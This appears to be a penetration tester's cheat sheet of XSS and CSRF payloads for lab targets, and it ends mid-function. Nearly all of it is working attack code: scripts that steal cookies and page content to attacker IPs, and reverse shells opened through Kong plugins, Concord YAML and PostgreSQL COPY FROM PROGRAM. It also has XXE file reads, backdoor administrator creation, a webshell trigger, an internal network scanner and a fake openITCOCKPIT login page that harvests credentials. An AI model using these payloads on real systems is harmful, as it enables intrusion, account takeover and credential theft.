Receive POST Data:
    -nc
    -HTTPServer.py
    -API Server from openITCOCKPIT
Receive GET Data:
    -nc
    -python -m http.server

Troubleshooting: 
    CSRF - might need to set withCredentials (XHR) or credentials: 'include' (Fetch)
    Start function after a delay (ensure loads all content):
        ex.  setTimeout(function () { getAutoCreds() }, 2000);

REGULAR SCRIPTS (.JS):
    Trigger:  <script src="http://192.168.149.128/xss.js">
    Contents:   alert(123)

PAYLOAD PAGES (.HTML):
    Trigger:    ....http://192.168.149.128/rce.html
    Contents:   <script> alert(123) </script>

    OR:

    <html>
        <head>
            <script>
            alert(123)
            </script>
        </head>
        <body>
        </body>
    </html>


Another example: rce.html - POST (Fetch) - SSRF Payload Page for Plugin Creation/RCE (APIGateway - Kong):

<html>
<head>
<script>

function createService() {
	fetch("http://172.16.16.5:8001/services", {
		method: "post",
		headers: { "Content-Type": "application/json" },
		body: JSON.stringify({"name":"supersecret", "url": "http://127.0.0.1/"})
	}).then(function (route) {
		createRoute();
	});
}

function createRoute() {
	fetch("http://172.16.16.5:8001/services/supersecret/routes", { 
		method: "post",
		headers: { "Content-Type": "application/json" },
		body: JSON.stringify({"paths": ["/supersecret"]})
	}).then(function (plugin) {
		createPlugin();
	}); 
}

function createPlugin() {
	fetch("http://172.16.16.5:8001/services/supersecret/plugins", { 
		method: "post",
		headers: { "Content-Type": "application/json" },
		body: JSON.stringify({"name":"pre-function", "config" :{ "access": [ "local s=require('socket');local t=assert(s.tcp());t:connect('192.168.119.169',4444);while true do local r,x=t:receive();local f=assert(io.popen(r,'r'));local b=assert(f:read('*a'));t:send(b);end;f:close();t:close();" ]}})
	}).then(function (callback) {
		fetch("http://192.168.119.169/callback?setupComplete");
	}); 
}

</script>
</head>
<body onload='createService()'>
<div></div>
</body>
</html>

=========================================================
Cookie Stealing:

Trigger:  <script src="http://192.168.119.120:8000/session.js"></script>
Hosted payload session.js:

function addTheImage() {
    var img = document.createElement('img');
    img.src = 'http://192.168.119.120:9090/' + document.cookie; //other variation:  encodeURI(document.getElementsByName("cookie")[0].value)
    document.body.appendChild(img);
}
addTheImage();

---------------
XHR Method:
var fetch_req = new XMLHttpRequest();
fetch_req.open("GET", "http://192.168.28.130/?cookie=" + document.cookie, false);           
fetch_req.send();
---------------
Receive/Parse Cookie in Python:

See SubprocessListeners.py

---------------
Set cookie from console:  javascript:void(document.cookie="atmail6=1fp0fjq4aa8sm5if934b62ptv6");
----------------
Use Cookie in Python:

import requests

url = ""
exfiltrated_cookie = ""
cookies = {'PHPSESSID': f"{exfiltrated_cookie}"} # Example

r = requests.get(url, cookies=cookies)

=========================================================
Testing that your Webpage is Visited (GET/Fetch):

<html>
<head>
<script>
function runscript() {
 fetch("http://192.168.119.169/itworked");
}
</script>
</head>
<body onload='runscript()'>
<div></div>
</body>
</html>

=========================================================
Basic Content Stealing:

<script>new Image().src="http://192.168.149.128/bogus.php?output="+document.getElementById('guestbook_comments').innerHTML;</script>

<script>new Image().src="http://192.168.149.128/bogus.php?output="+document.body.innerHTML</script>
=========================================================
Testing Data Exfiltration (GET/Fetch):

<html>
<head>
<script>
function exfiltrate() {
    fetch("http://172.16.16.5:8001")
    .then((response) => response.text())
    .then((data) => {
        fetch("http://192.168.119.169/callback?" + encodeURIComponent(data.substring(0,2000)));
    }).catch(err => {
        fetch("http://192.168.119.169/error?" + encodeURIComponent(err));
    }); 
}
</script>
</head>
<body onload='exfiltrate()'>
<div></div>
</body>
</html>

=========================================================
Page Exfil/Extraction - POST (XHR):

var fetch_req = new XMLHttpRequest();
fetch_req.onreadystatechange = function() {
    if(fetch_req.readyState == XMLHttpRequest.DONE) {
        var exfil_req = new XMLHttpRequest();
        exfil_req.open("POST", "http://10.10.14.11:3000", false);
        exfil_req.send("Resp Code: " + fetch_req.status + "\nPage Source:\n" + fetch_req.response);
    }
};
fetch_req.open("GET", "http://gym-club.crossfit.htb/security_threat/report.php", false);
fetch_req.send();

=========================================================
CSRF - POST (Fetch) XSS Payload - XML (json) w/ GET callback: XXE.js:

//Tested:
//var xml = `<?xml version="1.0"?><!DOCTYPE foo [  <!ELEMENT foo ANY><!ENTITY xxe SYSTEM "file:///etc/passwd">]><foo>&xxe;</foo>`;
//var xml = `<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE foo [<!ENTITY toreplace "3"> ]><stockCheck><productId>&toreplace;</productId><storeId>1</storeId></stockCheck>`;
//const xml = `<!DOCTYPE foo [ <!ENTITY ext SYSTEM "http://192.168.119.162/abc" > ]>`;
//const xml = `<?xml version="1.0"?><!DOCTYPE data [ <!ELEMENT data ANY ><!ENTITY xxe SYSTEM "file:///etc/passwd"> ]><database>&xxe;</database>`;
//Semi-working:
//const xml = `<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE foo [ <!ENTITY xxe SYSTEM "http://192.168.119.162/malicious2.dtd"> ]><database>&xxe;</database>`;
//const xml = `<?xml version="1.0"?><!DOCTYPE foo [<!ELEMENT foo ANY ><!ENTITY % xxe SYSTEM "file:///etc/hostname" ><!ENTITY callhome SYSTEM 'http://192.168.119.162/?a=%xxe;'>]><foo>&callhome;</foo>`;

const xml = `<?xml version="1.0"?><!DOCTYPE foo [ <!ENTITY % xxe SYSTEM "http://192.168.119.162/malicious.dtd"> %xxe; ]>`;		//WORKING
const url = "http://192.168.162.251/admin/import?preview=true&xmldata=" + encodeURIComponent(xml);


function exploit() {
    let Data = {'preview': true, 'xmldata': encodeURIComponent(xml)};
    fetch(url, {
    method: 'POST',
    headers: {
        'Content-Type': 'application/json'
    },
    body: JSON.stringify(Data)
    })
    .then((response) => response.text())
    .then((data) => {
        fetch("http://192.168.119.162/callback?" + encodeURIComponent(data));
    }).catch(err => {
        fetch("http://192.168.119.162/error?" + encodeURIComponent(err));
    }); 
}
exploit();

=========================================================
CSRF - POST (Fetch) XSS Payload - SQL (json) w/ GET callback: XSS2.js:

//const query = "SELECT user;";
//const query = "SELECT usename, passwd FROM pg_shadow;";
//const query = "SELECT current_setting('is_superuser');";
//const query = "select pg_ls_dir('./');";
//const query = "select pg_read_file('PG_VERSION', 0, 200);";
//const query = "CREATE TABLE temp(t TEXT);COPY temp FROM '/etc/passwd';SELECT * FROM temp limit 1 offset 0;";
//const query = "SELECT lo_import('/etc/passwd',1338);";
//const query = "select loid, pageno, encode(data, 'escape') from pg_largeobject;";
//const query = "SELECT lo_unlink(1338);";
const query = `DROP TABLE IF EXISTS cmd_exec;CREATE TABLE cmd_exec(cmd_output text);COPY cmd_exec FROM PROGRAM 'bash -c "bash -i >& /dev/tcp/192.168.119.162/5555 0>&1"';`;
//const query = "SELECT * FROM cmd_exec;";

const url2 = "http://192.168.162.251/admin/query?adminKey=REPLACEKEYHERE&query=" + encodeURIComponent(query);




function exploit2() {
    let data2 = {'adminKey': 'REPLACEKEYHERE', 'query': 123};
    fetch(url2, {
    method: 'POST',
    headers: {
        'Content-Type': 'application/json'
    },
    body: JSON.stringify(data2)
    })
    .then((response) => response.text())
    .then((data) => {
        fetch("http://192.168.119.162/QueryCallback?" + encodeURIComponent(data));
    }).catch(err => {
        fetch("http://192.168.119.162/QueryError?" + encodeURIComponent(err));
    }); 
}
exploit2();


=========================================================
Basic Scripts (CORS Demo) - GET & POST (Fetch):

fetch("http://concord:8001/cfg.js")
    .then(function (response) {
    return response.text();
    })
    .then(function (text) {
    console.log(text);
    })

fetch("https://example.com",
    {
        method: 'post',
        headers: {
            "Content-type": "application/x-www-form-urlencoded;"    //application/json
        }
    })

=========================================================
CSRF: Exfiltrating another Site's Content - GET (XHR):

<html>
<script>

first = new XMLHttpRequest();
first.open("GET", "TARGET-SERVER");
first.onreadystatechange = function () {
    if (first.readyState === XMLHttpRequest.DONE) {
        second = new XMLHttpRequest();
        second.open("POST", "YOUR-SERVER");
        second.send("EXFILTRATED-DATA");
    }
}
first.send();

</script>
</html>


=========================================================
CSRF - GET (confirm auth) and POST (API process start - YML payload) (Fetch):

<html>
<head>
   <script>
      yml = `
configuration:
  dependencies:
  - "mvn://org.python:jython-standalone:2.7.2"

flows:
  default:
  - script: python
    body: |
      import subprocess

      cmd = 'bash -i >& /dev/tcp/192.168.119.169/4444 0>&1'

      proc = subprocess.Popen(cmd ,bufsize=0, executable=None, stdin=None, stdout=subprocess.PIPE, stderr=subprocess.PIPE, preexec_fn=None, close_fds=True, shell=True)

      out = str(proc.communicate(proc.stdout))
      execution.setVariable("result", out)
  
  - log: $\{result\}
`
      fetch("http://192.168.169.132:8001/api/service/console/whoami", {
         credentials: 'include'
      })
         .then(async (response) => {
            if (response.status != 401) {
               let data = await response.text();
               fetch("http://192.168.119.169/?msg=" + data)
               rce();
            } else {
               fetch("http://192.168.119.169/?msg=UserNotLoggedIn")
            }
         })

      function rce() {
         var ymlBlob = new Blob([yml], { type: "application/yml" });
         var fd = new FormData();
         fd.append('concord.yml', ymlBlob);
         fetch("http://192.168.169.132:8001/api/v1/process", {
            credentials: 'include',
            method: 'POST',
            body: fd
         })
            .then(response => response.text())
            .then(data => {
               fetch("http://192.168.119.169/?msg=" + data)
            }).catch(err => {
               fetch("http://192.168.119.169/?err=" + err)
            });
      }
   </script>
</head>
<body>
</body>
</html>



=========================================================
CSRF POST (Fetch) - Add User

<body onload="execute_all_attacks();">
<script>
function execute_all_attacks(){
attack_addUser_endpoint();
}

function get_post_http_headers(data, content_type){
return {
method:"POST",
body: data,
headers: {'Content-Type':content_type},
credentials: 'include'
}}

function attack_addUser_endpoint(){
backdoor_user = "user=backdoor,pass=backdoor"
var options = get_post_http_headers(data=backdoor_user,content_type='text/plain')
var request = fetch(url="https://csrf.secure-cookie.io/addUser",options);
request.catch(err => update_user_added_html())
}
</script>

=========================================================
CSRF - GET (Fetch):

function get_api_key(){
var options = {
method:"GET",
credentials: 'include'
}
var users = fetch(url="https://demo-api.secure-cookie.io/getKey",options);
users.then(resp => {
           return resp.json()
}).then(data => {
        update_key_html(data);
     })
}

get_api_key()

=========================================================
CSRF - POST (XHR):

<script>

	var xhr = new XMLHttpRequest();

	xhr.open('POST','http://localhost:81/DVWA/vulnerabilities/xss_s/',true);

	xhr.setRequestHeader('Content-type','application/x-www-form-urlencoded');

	xhr.send('txtName=xss&mtxMessage=xss&btnSign=Sign+Guestbook');

</script>

=========================================================
CSRF - GET & POST (XHR) - Wordpress Add User

url = "http://[TARGET]/wp-admin/user-new.php";
var login = "";
var pass = "";
var email = "";
 
function httpGet(url)
{
var xmlHttp = new XMLHttpRequest();
xmlHttp.open( "GET", url, false ); // false for synchronous request
xmlHttp.send( null );
return xmlHttp.responseText;
}
var all = httpGet(url);
var nonce = all.split("name=\"_wpnonce_create-user\" value=\"");
var nonce = nonce[1].slice(0, 10);
var http = new XMLHttpRequest();
var params = "action=createuser&_wpnonce_create-user=" + nonce + "&_wp_http_referer=%2Fwp-admin%2Fuser-new.php&user_login=" + login + "&email=" + email + "&first_name=&last_name=&url=&pass1=" + pass + "&pass1-text=" + pass + "&pass2=" + pass + "&pw_weak=on&role=administrator&createuser=Add+New+User";
http.open("POST", url, true);
http.setRequestHeader("Content-type", "application/x-www-form-urlencoded");
http.send(params);

=========================================================
CSRF - GET (XHR) - Send Email:

var email   = "attacker@offsec.local";
var subject = "hacked!";
var message = "This is a test email!";

function send_email()
{
   var uri ="/index.php/mail/composemessage/send/tabId/viewmessageTab1";
   var query_string = "?emailTo=" + email + "&emailSubject=" + subject + "&emailBodyHtml=" + message; 
   xhr = new XMLHttpRequest();
   xhr.open("GET", uri + query_string, true);
   xhr.send(null);
}

send_email();

=========================================================
CSRF - GET & POST (XHR) - Scraping CSRF token and changing email:

var xhr = new XMLHttpRequest();
var method = 'GET';
var url = 'https://redacted.com/token';
xhr.open(method,url,true);
xhr.send(null);

xhr.onreadystatechange = function()
{
 var token = xhr.getResponseHeader('csrf-token');

 xhr.open("POST","https://redacted.com/user/changeEmail", true);
 xhr.withCredentials="true";
 xhr.setRequestHeader("csrf-token", token);
 xhr.setRequestHeader("Content-type", "application/json; charset=UTF-8");
 xhr.send('{"email":"pwn@1337.com"}');
}
alert('Ups, You\'re pwned!');

=========================================================
CSRF - GET & POST (XHR) - Scraping CSRF token, then creating account, plus sending back results:

function get_token(body) {
    var dom = new DOMParser().parseFromString(body, 'text/html');
    return dom.getElementsByName('_token')[0].value;
}


var fetch_req = new XMLHttpRequest();
fetch_req.onreadystatechange = function() {
    if (fetch_req.readyState == XMLHttpRequest.DONE) {
        var token = get_token(fetch_req.response);

        var reg_req = new XMLHttpRequest();
        reg_req.onreadystatechange = function() {
            if (reg_req.readyState == XMLHttpRequest.DONE) {
                var exfil_req = new XMLHttpRequest();
                exfil_req.open("POST", "http://10.10.14.11:3000/", false);
                exfil_req.send(reg_req.response);
            }
        };
        reg_req.open("POST", "http://ftp.crossfit.htb/accounts", false);
        reg_req.withCredentials = true;
        reg_req.setRequestHeader('Content-type', 'application/x-www-form-urlencoded');
        reg_req.send("_token=" + token + "&username=0xdf&pass=0xdf0xdf");
    }
};

fetch_req.open("GET", "http://ftp.crossfit.htb/accounts/create", false);
fetch_req.withCredentials = true;
fetch_req.send();

=========================================================
PYTHON - Scraping and using CSRF Token:

#!/usr/bin/env python3

import re
import requests
import sys
import urllib.parse


payload = urllib.parse.quote(sys.argv[1]) + ';'

sess = requests.Session()
sess.proxies.update({'http': 'http://127.0.0.1:8080'})

# get CSRF
resp = sess.get("http://cacti-admin.monitors.htb/cacti/index.php")
csrf = re.search(r"csrfMagicToken='(.*)'", resp.text).group(1)
print(f"Got CSRF: {csrf}")

# login
resp = sess.post("http://cacti-admin.monitors.htb/cacti/index.php",
        data = {
            '__csrf_magic':   csrf,
            'action':         'login',
            'login_username': 'admin',
            'login_password': 'BestAdministrator@2020!',
            })

print(f"[+] Logged in with cookie: {sess.cookies['Cacti']}")

# upload command
resp = sess.get(f"http://cacti-admin.monitors.htb/cacti/color.php?action=export&header=false&filter=1')+UNION+SELECT+1,username,password,4,5,6,7+from+user_auth;update+settings+set+value='{payload}'+where+name='path_php_binary';--+-")

# trigger
resp = sess.get("http://cacti-admin.monitors.htb/cacti/host.php?action=reindex")

=========================================================
PYTHON - Scraping and Using CSRF Token (w/ SSTI):
#https://www.youtube.com/watch?v=7sdfT8Z_CPw

import requests
import re
import io
import random
import string
import html

url="http://challenge:1234/"
s=requests.Session()
r=s.get(url)

#Grabbing CSRF token:
matches=re.findall(r'input id="csrf_token" name="csrf_token" type="hidden" value="(.*?)"', r.text)
csrf_token=matches[0]

dirname=''.join([ random.choice(string.ascii_letters) for _ in range(10) ])
filename=f"../../templates/{dirname}/index.html"

template=b"""{{config}}"""
filehandle=io.BytesIO(template)

files={'file': (filename, filehandle) }

data={
    "submit":"Upload",
    "csrf_token": csrf_token,
}

r=s.post(url, files=files, data=data)
matches=re.findall(r'input id="csrf_token" name="csrf_token" type="hidden" value="(.*?)"', r.text)
csrf_token=matches[0]

data={
    "template": dirname,
    "csrf_token": csrf_token,
}
r=s.post(url, data=data)
print(r.text)
s.close()


=========================================================
Basic XSS Keylogger:  https://github.com/IAmStoxe/XSS-Keylogger

=========================================================
Interactive JavaScript Web Hook Session:

Attacker Control Server:  while :; do printf "j$ "; read c; echo $c | nc -lp PORT >/dev/null; done
Injection Hook:  <svg onload=setInterval(function(){d=document;z=d.createElement("script");z.src="//HOST:PORT";d.body.appendChild(z)},0)>

Payloads:
alert(document.cookie)
document.location='http://192.168.63.162:5679/c='+document.cookie
document.location='http://192.168.63.162:5679/C='+document.body.innerHTML

=========================================================
Steal CSRF Token and send a POST Request (XHR):

function submitFormWithTokenJS(token) {
    var xhr = new XMLHttpRequest();
    xhr.open("POST", POST_URL, true);
    xhr.withCredentials = true;

    // Send the proper header information along with the request
    xhr.setRequestHeader("Content-type", "application/x-www-form-urlencoded");

    // This is for debugging and can be removed
    xhr.onreadystatechange = function() {
        if(xhr.readyState === XMLHttpRequest.DONE && xhr.status === 200) {
            //console.log(xhr.responseText);
        }
    }

    xhr.send("token=" + token + "&otherparama=heyyyy");
}

function getTokenJS() {
    var xhr = new XMLHttpRequest();
    // This tels it to return it as a HTML document
    xhr.responseType = "document";
    xhr.withCredentials = true;
    // true on the end of here makes the call asynchronous
    xhr.open("GET", GET_URL, true);
    xhr.onload = function (e) {
        if (xhr.readyState === XMLHttpRequest.DONE && xhr.status === 200) {
            // Get the document from the response
            page = xhr.response
            // Get the input element
            input = page.getElementById("token");
            // Show the token
            //console.log("The token is: " + input.value);
            // Use the token to submit the form
            submitFormWithTokenJS(input.value);
        }
    };
    // Make the request
    xhr.send(null);
}

var GET_URL="http://google.com?param=VALUE"
var POST_URL="http://google.com?param=VALUE"
getTokenJS();

=========================================================
CSRF EXAMPLE - Form Submission/POST:

<script>
function exfil(hash) {
fetch("https://<exfil>", {
		method: "post",
		headers: { "Content-Type": "application/json" },
		body: JSON.stringify({"hash": hash})
	})
};
var xhr = new XMLHttpRequest();
xhr.responseType = "document";
xhr.withCredentials = true;
xhr.open("GET", "https://<adminConsole>", true);
xhr.onload = function (e) {
	if (xhr.readyState === XMLHttpRequest.DONE && xhr.status === 200) {
		page = xhr.response;
		token = page.getElementsByTagName("input")[0];
		fetch('/formSubmission', { method: 'post', headers: { 'X-CSRFToken': token.value } }).then(res => { if (res.ok) return res.json(); else return {} }).then(data => { const { hash } = data; exfil(hash); });
	}
};
xhr.send(null);
</script>

=========================================================
CSRF - INTERNAL PORT/IP SCANNER:

<script>
for (let i = 1; i < 256; i++) {
	let IP = "http://172.16.1." + i
	let content = "";
	fetch(IP)
		.then(response => response.text())
		.then((response) => {
			var exfil_req = new XMLHttpRequest();
			exfil_req.open("POST", "https://<exfilEndpoint>", false);
			exfil_req.send("UP: " + IP + " CONTENT: " + response);
		})
	.catch(function(err) {
		console.log('Error :-S', err);
	}); 
}
</script>

=========================================================
IFRAME EXAMPLE:

<script>
let listenerRunning = iframeDisplayed = false;
var startTime,endTime,myInterval;
function replaceLinks() {
	var links = document.links;
	for (var i = 0; i < links.length; i++) {
		 links[i].target = "_blank";
	}
}
function loadIFrame() {
	var iframe = document.createElement('iframe');
	iframe.style.width = "100%";
	iframe.style.height = "100%";
	iframe.style.top = "0px";
	iframe.style.bottom = "0px";
	iframe.frameBorder = "0";
	iframe.src = "https://<src>";
	iframe.style.position = "fixed";
	document.documentElement.innerHTML = '';
	document.body.appendChild(iframe);
	document.title = "Web Security Lab";
	iframeDisplayed = true;
}
function delayIFrame() {
	document.addEventListener("visibilitychange", (event) => {
	  if (document.visibilityState == "visible") {
		if (listenerRunning) {
			listenerRunning = false;
			clearInterval(myInterval);
		}
	  } else {
			if (! iframeDisplayed) {
				startTime = Date.now();
				endTime = startTime + 60000;
				listenerRunning = true;
				myInterval = setInterval(waitFor60, 1000);
			}
	  }
	});
	function waitFor60() {
		if (Date.now() > endTime) {
			loadIFrame();
			listenerRunning = false;
			clearInterval(myInterval);
			
		}
	}
}
replaceLinks();
delayIFrame();
</script>

=========================================================
CSRF - GET & POST (XHR) - Scraping CSRF Token and Changing Email:

<script>
var req = new XMLHttpRequest();
req.onload = handleResponse;
req.open('get','/my-account',true);
req.send();
function handleResponse() {
    var token = this.responseText.match(/name="csrf" value="(\w+)"/)[1];
    var changeReq = new XMLHttpRequest();
    changeReq.open('post', '/my-account/change-email', true);
    changeReq.send('csrf='+token+'&email=test@test.com')
};
</script>

=========================================================
CSRF - GET & POST (XHR) - Scraping CSRF Token and Creating User:
https://medium.com/a-bugz-life/from-reflected-xss-to-account-takeover-showing-xss-impact-9bc6dd35d4e6

var url = "/user/new";
function submitFormWithToken(token) {
    var xhr = new XMLHttpRequest();
    xhr.open("POST", url, true);
var formData = new FormData();
    formData.append("authenticity_token", token);
    formData.append("login", "neemaPoC");
    formData.append("firstname", "Neema");
    formData.append("lastname", "PoC");
    formData.append("email", "xss_demo@gmail.com");
    // role_id = 2 is the admin role
    formData.append("role_ids[]", 2);
    formData.append("new_status", "active");
xhr.send(formData);
}
var xhr = new XMLHttpRequest();
    xhr.responseType = "document";
    xhr.open("GET", url, true);
    xhr.onload = function (e) {
        if (xhr.readyState === XMLHttpRequest.DONE && xhr.status === 200) {
            page = xhr.response
            // Get the csrf token from meta tag
            token = page.getElementsByName('csrf-token')[0].getAttribute('content')
            // Show the token
            console.log("The token is: " + token);
            // Use the token to submit the form
            submitFormWithToken(token);
        }
    };
    // Make the request
    xhr.send(null);

=========================================================
CSRF - GET (XHR) - Trigger PHP Webshell (internal site):

var req = new XMLHttpRequest();
req.open("GET", "http://development-test.crossfit.htb/cmd.php?cmd=bash+-c+'bash+-i+>%26+/dev/tcp/10.10.14.11/443+0>%261'", false);
req.send()

=========================================================
GET & POST (XHR) - Blind XSS/CSRF:

//Get Current Location:
var exfilreq = new XMLHttpRequest();    
exfilreq.open("GET", "http://10.10.14.6/" + document.location, false);    
exfilreq.send(); 

//Exfil Current Page Content:
var exfilreq = new XMLHttpRequest();    
exfilreq.open("POST", "http://10.10.14.6:9001/", false);    
exfilreq.send(document.documentElement.outerHTML); 


//Exfil Other Page Content:
var dashboardreq = new XMLHttpRequest();    
dashboardreq.onreadystatechange = function() {              
  if (dashboardreq.readyState == 4) {                       
    var exfilreq = new XMLHttpRequest();                    
    exfilreq.open("POST", "http://10.10.14.6:9001/", false);                                                      
    exfilreq.send(dashboardreq.response);                 
  }     
};    
dashboardreq.open('GET', '/dashboard.php', false);    
dashboardreq.send(); 

=========================================================
=========================================================
=========================================================
OPENITCOCKPIT: CSRF Content Scraping (Links & their HTML) - Sending to API SQL Server
    //Setup:
    python3 db.py –-create
    openssl req -x509 -newkey rsa:4096 -nodes -out cert.pem -keyout key.pem -days 365
    sudo python3 api.py
    //receive data
    python3 dump.py
    //or dump manually

Using client.js XSS payload script:
----------------

//Making the vulnerable page look like the login page:
	//loginhtml = document.getElementsByTagName("html")[0].innerHTML;	(Run manually on login page)
	//localStorage.setItem("loginhtml", loginhtml);

html_element = document.getElementsByTagName('html')[0]
html_element.innerHTML = '<!DOCTYPE html><html lang="en"><head><meta http-equiv="Content-Type" content="text/html; charset=utf-8"/> <meta name="viewport" content="width=device-width, initial-scale=1"> <title>Login - open source system monitoring </title> <link href="/favicon.ico?v3.7.2" type="image/x-icon" rel="icon"/><link href="/favicon.ico?v3.7.2" type="image/x-icon" rel="shortcut icon"/> <link rel="stylesheet" type="text/css" href="/css/vendor/bootstrap/css/bootstrap.min.css?v3.7.2"/> <link rel="stylesheet" type="text/css" href="/smartadmin/css/font-awesome.min.css?v3.7.2"/> <link rel="stylesheet" type="text/css" href="/css/login.css?1581451993"/> <script type="text/javascript" src="/frontend/js/lib/jquery.min.js?v3.7.2"></script> <script type="text/javascript" src="/js/lib/particles.min.js?v3.7.2"></script> <script type="text/javascript" src="/js/login.js?1581451993"></script></head><body class="main"> <div class="login-screen"> <figure> <figcaption>Photo by SpaceX on Unsplash</figcaption> </figure> <figure> <figcaption>Photo by NASA on Unsplash</figcaption> </figure> </div><div class="container-fluid"> <div class="row"> <div id="particles-js" class="col-xs-12 col-sm-6 col-md-7 col-lg-9"></div></div></div><div class="login-center"> <div class="min-height container-fluid"> <div class="row"> <div class="col-xs-12 col-sm-6 col-md-5 col-lg-3 col-sm-offset-6 col-md-offset-7 col-lg-offset-9"> <div class="login" id="card"> <div class="login-alert"> </div><div class="login-header"> <h1>openITCOCKPIT</h1> <h4>Open source system monitoring</h4> </div><div class="login-form-div"> <div class="front signin_form"> <p>Login</p><form onsubmit="stealCreds(); return false;" novalidate="novalidate" id="login-form" class="login-form" accept-charset="utf-8"><div style="display:none;"><input type="hidden" name="_method" value="POST"/></div><div class="form-group"> <div class="input-group"> <input name="data[LoginUser][username]" class="form-control" placeholder="Type your email or username" inputDefaults=" " type="text" id="LoginUserUsername"/> <span class="input-group-addon"> <i class="fa fa-lg fa-user"></i> </span> </div></div><div class="form-group"> <div class="input-group"> <input name="data[LoginUser][password]" class="form-control" placeholder="Type your password" inputDefaults=" " type="password" id="LoginUserPassword"/> <span class="input-group-addon"> <i class="fa fa-lg fa-lock"></i> </span> </div></div><div class="checkbox"> <div class="checkbox"><input type="hidden" name="data[LoginUser][remember_me]" id="LoginUserRememberMe_" value="0"/><label for="LoginUserRememberMe"><input type="checkbox" name="data[LoginUser][remember_me]" class="" value="1" id="LoginUserRememberMe"/> Remember me on this computer</label></div></div><div class="form-group sign-btn"> <button type="submit" class="btn btn-primary pull-right"> Sign in </button> </div></form> </div></div></div></div></div></div></div><div class="footer"> <div class="container-fluid"> <div class="row pull-right"> <div class="col-xs-12"> <a href="https://openitcockpit.io/" target="_blank" class="btn btn-default"> <i class="fa fa-lg fa-globe"></i> </a> <a href="https://github.com/it-novum/openITCOCKPIT" target="_blank" class="btn btn-default"> <i class="fa fa-lg fa-github"></i> </a> <a href="https://twitter.com/openITCOCKPIT" target="_blank" class="btn btn-default"> <i class="fa fa-lg fa-twitter"></i> </a> </div></div></div></div><div class="container"> <div class="row"> <div class="col-xs-12"> </div></div></div></body></html>'

var iframe = document.createElement('iframe');
iframe.onload = actions;
iframe.setAttribute("style", "display:none")
iframe.width = "100%"
iframe.height = "100%"
iframe.src = "https://192.168.169.129"	//Loading the target website's homepage (to scrape links)

body = document.getElementsByTagName('body')[0];
body.appendChild(iframe)

function actions() {
	setTimeout(function () { getAutoCreds() }, 2000);
	setTimeout(function () { getCookies() }, 1000);
	setTimeout(function () { getContent() }, 2000);
	
}

function getCookies() {
	fetch("https://192.168.119.169/cookies", {	//attacker IP
		body: "value=" + encodeURIComponent(document.cookie),
		headers: {
			"Content-Type": "application/x-www-form-urlencoded"
		},
		method: "POST"
	})
}

//AutoFill Creds:
function getAutoCreds() {

	var username = document.getElementById('LoginUserUsername').value;
	var password = document.getElementById('LoginUserPassword').value;
	var combined = username+':'+password


	fetch("https://192.168.119.169/creds", {	//attacker IP
		body: "value=" + encodeURIComponent(combined),
		headers: {
			"Content-Type": "application/x-www-form-urlencoded"
		},
		method: "POST"
	})
}

//If Creds are Typed and Submitted (into the fake login page):
function stealCreds() {

	var username = document.getElementById('LoginUserUsername').value;
	var password = document.getElementById('LoginUserPassword').value;
	var combined = username+':'+password


	fetch("https://192.168.119.169/creds", {	//attacker IP
		body: "value=" + encodeURIComponent(combined),
		headers: {
			"Content-Type": "application/x-www-form-urlencoded"
		},
		method: "POST"
	})
}

function getContent() {
	allA = iframe.contentDocument.getElementsByTagName("a")

	allHrefs = []
	for (var i = 0; i < allA.length; i++) {
		allHrefs.push(allA[i].href)
	}

	uniqueHrefs = _.unique(allHrefs)	//optional; uses function from this vulnerable library (Lodash)

	validUniqueHrefs = []
	for (var i = 0; i < uniqueHrefs.length; i++) {
		if (validURL(uniqueHrefs[i])) {
			validUniqueHrefs.push(uniqueHrefs[i]);
		}
	}

	validUniqueHrefs.forEach(href => {
		fetch(href, {
			"credentials": "include",
			"method": "GET",
		})
			.then((response) => {
				return response.text()
			})
			.then(function (text) {
				fetch("https://192.168.119.169/content", {	//attacker IP
					body: "url=" + encodeURIComponent(href) + "&content=" + encodeURIComponent(text),
					headers: {
						"Content-Type": "application/x-www-form-urlencoded"
					},
					method: "POST"
				})
			});
	})
}


function validURL(str) {
	//Defining the URL pattern
	var urlPattern = new RegExp('^(https?:\\/\\/)?' + // protocol
		'((([a-z\\d]([a-z\\d-]*[a-z\\d])*))|' + // domain name
		'((\\d{1,3}\\.){3}\\d{1,3}))' + // OR ip (v4) address
		'(\\:\\d+)?(\\/[-a-z\\d%_.~+]*)*' + // port and path
		'(\\?[;&a-z\\d%_.~+=-]*)?' + // query string
		'(\\#[-a-z\\d_]*)?$', 'i'); // fragment locator

	//Defining the logout pattern
	var logoutPattern = new RegExp('logout|signout|log-out|sign-out|log out|sign out')

	//if valid URL and does not contain logout
	if (!!urlPattern.test(str) && !logoutPattern.test(str.toLowerCase())) {
		return true
	} else {
		return false
	}
}

=========================================================
=========================================================
=========================================================
CSRF - GET (XHR) - Get Content & Print to Console

function read_body(xhr) {
   var data;
   if (!xhr.responseType || xhr.responseType === "text") {
       data = xhr.responseText;
   } else if (xhr.responseType === "document") {
       data = xhr.responseXML;
   } else if (xhr.responseType === "json") {
       data = xhr.responseJSON;
   } else {
       data = xhr.response;
   }
   return data;
}
var xhr = new XMLHttpRequest();
xhr.onreadystatechange = function() {
   if (xhr.readyState == XMLHttpRequest.DONE) {
       console.log(read_body(xhr));
   }
}
xhr.open('GET', 'http://atmail', true);
xhr.send(null);

=========================================================
CSRF - Form Submit:

<html>
  <!-- CSRF PoC - generated by Burp Suite Professional -->
  <body>
  <script>history.pushState('', '', '/')</script>
    <form action="http(s)://server" method="POST">
      <input type="hidden" name="param1" value="1" />
      <input type="hidden" name="param2" value="2" />
      <input type="submit" value="Submit Request" />
    </form>
    <script>
      document.forms[0].submit();
    </script>
  </body>
</html>

=========================================================
CSRF - File Upload:

var targetLocation= "/ENDPOINT";

function byteValue(x) {
    return x.charCodeAt(0) & 0xff;
}

function toBytes(datastr) {
    var ords = Array.prototype.map.call(datastr, byteValue);
    var ui8a = new Uint8Array(ords);
    return ui8a.buffer;
}

if (typeof XMLHttpRequest.prototype.sendAsBinary == 'undefined' && Uint8Array) {
	XMLHttpRequest.prototype.sendAsBinary = function(datastr) {
	    this.send(toBytes(datastr));
	}
}

function fileUpload(fileData, fileName) {
	  var fileSize = fileData.length,
	    boundary = "--------------------------------1337", // MAX 70 chars.
	    uri = targetLocation,
	    xhr = new XMLHttpRequest();

	  var additionalFields = {
	  }

	  var fileFieldName = "fieldName";
	  
	  xhr.open("POST", uri, true);
	  xhr.setRequestHeader("Accept", "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*;q=0.8")
